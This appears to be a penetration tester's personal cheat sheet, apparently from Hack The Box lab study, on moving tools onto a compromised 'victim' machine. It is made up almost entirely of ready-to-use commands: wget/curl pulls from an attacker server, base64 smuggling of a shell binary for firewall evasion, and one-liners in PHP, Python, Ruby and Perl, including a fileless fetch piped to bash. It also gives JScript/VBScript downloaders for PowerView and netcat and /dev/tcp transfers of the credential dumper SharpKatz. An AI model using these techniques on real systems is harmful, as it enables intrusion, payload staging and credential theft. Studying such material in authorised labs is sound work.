
### wget

On Kali
```bash
cd /tmp
python3 -m http.server 8000
```

On Victim
```bash
wget http://10.10.14.1:8000/linenum.sh
```
```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
(-o is for output name)


### scp

On Kali
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
![[Pasted image 20250325024416.png]]


### Using Base64 (Firewall evasion)

Only use this if firewall ends up blocking our other methods

On Kali
![[Pasted image 20250325025014.png]]
```bash
base64 shell -w 0
```
Ctrl-C the value afterwards


On Victim
![[Pasted image 20250325025103.png]]
```bash
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAlIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```


#### Python

```shell
p

python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

```


#### PHP

```shell
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Fileless method
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```


#### Ruby

```shell
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```


#### Perl

```shell
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```


#### Javascript

 Save this script to wget.js
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

After doing the above execute this command to download files
```shell
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```


#### VBScript

Save this script to wget.vbs
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

After doing the above 
```shell
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```


#### Netcat

On Receiving Machine:
```bash
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

On Sending Machine:
```shell
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

##### Netcat (Second Method)

On Sending Machine:
```shell
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

On Receiving Machine:
```shell
nc 192.168.49.128 443 > SharpKatz.exe

cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


#### WinRM - File Transfer

```powershell
$Session = New-PSSession -ComputerName DATABASE01

Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```


#### RDP - File Transfer

###### Mounting Share
```shell
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

